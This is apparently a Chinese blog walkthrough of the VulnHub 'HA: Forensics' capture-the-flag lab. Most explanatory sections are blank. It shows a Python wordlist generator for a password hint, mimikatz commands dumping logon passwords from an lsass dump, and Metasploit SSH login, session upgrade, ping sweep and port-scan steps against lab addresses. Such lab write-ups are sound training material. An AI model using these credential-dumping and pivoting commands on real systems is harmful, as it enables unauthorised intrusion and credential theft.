# 原创
：  VulnHub渗透测试实战靶场-HA: FORENSICS

# VulnHub渗透测试实战靶场-HA: FORENSICS

#### VulnHub渗透测试实战靶场-HA: FORENSICS

## 题目描述

```
HA: Forensics is an intermediate level of the lab, which gives you a hand on real-life experience in Cyber Forensic Investigation. This lab is completely dedicated to methods and tools of Cyber Forensic Investigation and there is evidence that can be found with various techniques. As it is a Capture-the-Flag, it is very important to note that it is not a root challenge, and comes with a primary motive to find all the flags.

No. of Flags: 4

Objective: Find all 4 flags (Getting Root is NOT the objective)

```

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/ha/forensics.ova)


## HA: FORENSICS靶机搭建

> 
将下载好的靶机环境，导入VMware，将其网络适配设置为`NAT`模式，运行即可


## 渗透测试

### 信息搜集

> 



> 



> 



### Flag获取

#### Flag-1

> 



> 



#### Flag-2

> 



> 



```
In case the forensic investigator forgets his password, this hint can help him, where the password is of 6 characters long , starting  3 characters is the word  "for" and the ending 3 characters are numeric

```

> 



```
f = open(r'./passwd.txt','a')
for i in range(0,1000):
    if len(str(i)) &lt; 2:
        print('for00' + str(i),file=f)
    elif len(str(i)) &lt; 3:
        print('for0' + str(i),file=f)
    else:
        print('for' + str(i),file=f)

```

> 



#### Flag-3

> 



```
mimikatz # sekurlsa::minidump lsass.dmp

mimikatz # sekurlsa::logonPasswords full

```

> 



```
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.246.142
set username jasoos
set password Password@1
exploit

```

> 



```
sessions -l
sessions -u 1
sessions -l
sessions 2

```

> 



> 



```
set session 3
exploit
use post/multi/gather/ping_sweep
set session 3 
set rhosts 172.17.0.0/24
exploit

```

> 



```
use auxiliary/scanner/portscan/tcp
set rhosts 172.17.0.2
set ports 1-2000
exploit

```

> 



> 



#### Flag-4

> 



> 


